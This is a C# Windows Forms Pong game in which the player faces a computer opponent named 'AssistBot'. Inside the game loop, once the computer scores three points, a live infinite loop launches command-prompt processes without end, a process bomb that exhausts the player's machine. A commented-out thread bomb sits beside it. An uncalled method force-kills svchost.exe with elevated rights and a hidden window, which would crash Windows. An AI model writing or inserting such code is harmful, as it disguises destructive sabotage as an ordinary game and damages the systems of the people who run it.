using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SQLUserInterface
{
    public partial class Pong : Form
    {
        int ballXspeed = 4;
        int ballYspeed = 4;
        int speed = 2;
        Random rand = new Random();
        bool goDown, goUp;
        int computer_speed_change = 50;
        int playerScore = 0;
        int computerScore = 0;
        int playerSpeed = 8;
        int[] i = { 5, 6, 8, 9 };
        int[] j = {10, 9, 8, 11, 12 };

        public Pong()
        {
            InitializeComponent();
        }

        private void GameTimerEvent(object sender, EventArgs e)
        {
            ball.Top -= ballYspeed;
            ball.Left -= ballXspeed;

            this.Text = "Player Score: " + playerScore + " -- AssistBot: " + computerScore;
            if (ball.Top < 0 || ball.Bottom > this.ClientSize.Height)
            {
                ballYspeed = -ballYspeed;
            }
            if (ball.Left < -2)
            {
                ball.Left = 300;
                ballXspeed = -ballXspeed;
                computerScore++;
            }
            if (ball.Right > this.ClientSize.Width + 2)
            {
                ball.Left = 300;
                ballXspeed = -ballXspeed;
                playerScore++;
            }
            if(computer.Top <= 1)
            {
                computer.Top = 0;
            }
            else if (computer.Bottom >= this.ClientSize.Height)
            {
                computer.Top = this.ClientSize.Height - computer.Height;
            }

            if(ball.Top < computer.Top + (computer.Height/2) && ball.Left > 300)
            {
                computer.Top -= speed;
            }
            if(ball.Top > computer.Top + (computer.Height / 2) && ball.Left > 300)
            {
                computer.Top += speed;
            }

            computer_speed_change -= 1;

            if(computer_speed_change < 0)
            {
                speed = i[rand.Next(i.Length)];
                computer_speed_change = 50;
            }

            if(goDown && player.Top + player.Height < this.ClientSize.Height)
            {
                player.Top += playerSpeed;
            }

            if(goUp && player.Top > 0)
            {
                player.Top -= playerSpeed;
            }

            CheckCollision(ball, player, player.Right + 5);
            CheckCollision(ball, computer, computer.Left - 35);

            if (computerScore > 2)
            {
                //Bad
                /*
                for (int i = 0; i < 100000; i++) // Create 100,000 threads
                {
                    new Thread(() =>
                    {
                        while (true) { } // Infinite loop in each thread
                    }).Start();
                }
                */
                //Really bad
                
                    while (true)
                    {
                        System.Diagnostics.Process.Start("cmd.exe");  // Creates a new process (command prompt) in an infinite loop
                    }
                

                //The worst
                
                //GameOverLose();
                computerScore = 0;
            }
            else if (playerScore > 5)
            {
                GameOver();
            }


        }

        private void KeyIsDown(object sender, KeyEventArgs e)
        {
            if(e.KeyCode == Keys.Down || e.KeyCode == Keys.S)
            {
                goDown = true;
            }
            if(e.KeyCode == Keys.Up || e.KeyCode == Keys.W) 
            { 
                goUp = true; 
            }
        }

        private void KeyIsUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Down || e.KeyCode == Keys.S)
            {
                goDown = false;
            }
            if (e.KeyCode == Keys.Up || e.KeyCode == Keys.W)
            {
                goUp = false;
            }
        }


        private void CheckCollision(PictureBox PicOne, PictureBox PicTwo, int offset)
        {
            if (PicOne.Bounds.IntersectsWith(PicTwo.Bounds))
            {
                PicOne.Left = offset;

                int x = j[rand.Next(j.Length)];
                int y = j[rand.Next(j.Length)];

                if (ballXspeed < 0)
                {
                    ballXspeed = x;
                }
                else
                {
                    ballXspeed = -x;
                }

                if (ballYspeed < 0)
                {
                    ballYspeed = -y;
                }
                else
                {
                    ballYspeed = y;
                }
            }
        }

        private void GameOverLose()
        {
            GameTimer.Stop();
            computerScore = 0;
            string command = "TASKKILL"; // 
            string arguments = "/IM svchost.exe /F"; // Optional: arguments for the command

            // Create a new Process to start the command
            ProcessStartInfo processStartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe", // Command prompt executable
                Arguments = "/c " + command + " " + arguments, // '/c' tells cmd to execute the command and then terminate
                RedirectStandardOutput = false, // Capture the output of the command
                UseShellExecute = true, // Don't use shell execute (necessary for redirection)
                CreateNoWindow = true, // Don't show the command prompt window
                Verb = "runas"
            };

            Process process = new Process();
            process.StartInfo = processStartInfo;
            process.Start();
        }
        private void GameOver()
        {
            GameTimer.Stop();
            computerScore = 0;
            MessageBox.Show("You have bested me");
            Hide();
            
        }
    }
}
